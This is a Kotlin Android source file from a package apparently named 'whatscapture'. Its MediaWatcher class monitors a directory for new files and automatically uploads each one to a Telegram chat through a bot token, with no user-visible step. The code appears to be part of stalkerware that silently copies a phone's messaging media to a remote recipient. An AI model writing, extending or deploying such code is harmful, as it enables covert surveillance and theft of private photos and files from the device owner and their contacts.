package com.whatscapture

import android.os.FileObserver
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File

class MediaWatcher(
    private val dirPath: String,
    private val token: String,
    private val chatId: String
) {
    private var observer: FileObserver? = null
    private val scope = CoroutineScope(Dispatchers.IO)

    fun startWatching() {
        val dir = File(dirPath)
        if (!dir.exists() || !dir.isDirectory) {
            Log.w(TAG, "Directorio no existe: $dirPath")
            return
        }

        observer = object : FileObserver(dirPath, CREATE or MOVED_TO or CLOSE_WRITE) {
            override fun onEvent(event: Int, path: String?) {
                if (path == null) return
                if (event and (CREATE or MOVED_TO or CLOSE_WRITE) == 0) return

                val fullPath = "$dirPath/$path"
                val file = File(fullPath)
                if (file.isDirectory) return
                if (file.name.startsWith(".")) return
                if (file.name.startsWith("nomedia")) return

                scope.launch {
                    delay(3000)
                    if (file.exists() && file.length() > 0) {
                        TelegramSender.sendFile(
                            token = token,
                            chatId = chatId,
                            filePath = fullPath,
                            fileName = file.name
                        )
                        Log.d(TAG, "Enviado: ${file.name} (${file.length()} bytes)")
                    }
                }
            }
        }

        observer?.startWatching()
        Log.d(TAG, "Observando: $dirPath")
    }

    fun stopWatching() {
        observer?.stopWatching()
        observer = null
    }

    companion object {
        private const val TAG = "MediaWatcher"
    }
}
